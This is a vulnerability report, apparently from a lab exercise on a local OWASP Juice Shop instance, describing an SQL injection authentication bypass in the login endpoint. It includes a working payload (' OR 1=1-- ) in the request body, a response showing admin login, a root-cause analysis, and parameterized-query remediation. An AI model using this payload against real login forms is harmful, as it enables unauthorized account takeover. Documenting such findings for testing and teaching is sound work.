\# Vulnerability Report: SQL Injection — Authentication Bypass



| Field | Detail |

|---|---|

| \*\*Title\*\* | SQL Injection in Login Endpoint Leading to Authentication Bypass |

| \*\*Severity\*\* | Critical |

| \*\*CVSS 3.1 Score\*\* | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |

| \*\*Category\*\* | OWASP Top 10 — A03:2021 Injection |

| \*\*CWE\*\* | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |

| \*\*Affected Endpoint\*\* | `POST /rest/user/login` |

| \*\*Affected Parameter\*\* | `email` |

| \*\*Target\*\* | OWASP Juice Shop (local test instance) |

| \*\*Tester\*\* | mohammed23010 |



\---



\## 1. Summary



The login endpoint (`POST /rest/user/login`) is vulnerable to SQL Injection.

User input in the `email` field is concatenated directly into the backend SQL

query without sanitization or parameterization. An attacker can inject SQL

syntax to bypass authentication entirely and log in as the administrator

without knowing any password.



\---



\## 2. Impact



\- \*\*Full authentication bypass\*\* — login as any user without credentials.

\- \*\*Administrative access\*\* — the injected query returns the first database

&#x20; record, which is the admin account (`admin@juice-sh.op`).

\- A valid session JWT is issued, granting full authenticated access.

\- Potential for further data extraction via UNION-based injection.



\*\*Business risk:\*\* complete compromise of user accounts and administrative

functions, exposure of all customer data.



\---



\## 3. Steps to Reproduce



1\. Navigate to the login page and submit any credentials while intercepting

&#x20;  with Burp Suite.

2\. Send the `POST /rest/user/login` request to Repeater.

3\. Replace the request body with:



```json

&#x20;  {"email":"' OR 1=1-- ","password":"123456"}

```



4\. Send the request.



\### Response (abridged)

```http

HTTP/1.1 200 OK

Content-Type: application/json



{

&#x20; "authentication": {

&#x20;   "token": "eyJ0eXAiOiJKV1Qi...",

&#x20;   "bid": 1,

&#x20;   "umail": "admin@juice-sh.op"

&#x20; }

}

```



The `200 OK` response with a valid `token` and `"umail":"admin@juice-sh.op"`

confirms successful authentication as the administrator.



\---



\## 4. Root Cause



The backend builds the query by concatenating the `email` value directly:



```sql

SELECT \* FROM Users WHERE email = '<input>' AND password = '<hash>'

```



The payload `' OR 1=1-- ` transforms it into:



```sql

SELECT \* FROM Users WHERE email = '' OR 1=1-- ' AND password = '...'

```



\- `' ` closes the string literal.

\- `OR 1=1` makes the condition always true.

\- `-- ` comments out the password check.



\---



\## 5. Remediation



\- \*\*Use parameterized queries / prepared statements\*\* — never concatenate input.

\- \*\*Use an ORM\*\* with safe query building.

\- \*\*Validate input\*\* on the `email` field as defense-in-depth.

\- \*\*Enforce least privilege\*\* on the database account.



```javascript

// Unsafe (vulnerable):

db.query("SELECT \* FROM Users WHERE email = '" + email + "'");



// Safe (parameterized):

db.query("SELECT \* FROM Users WHERE email = ?", \[email]);

```



\---



\## 6. References



\- OWASP A03:2021 Injection: https://owasp.org/Top10/A03\_2021-Injection/

\- CWE-89: https://cwe.mitre.org/data/definitions/89.html

\- OWASP SQL Injection Prevention Cheat Sheet:

&#x20; https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html

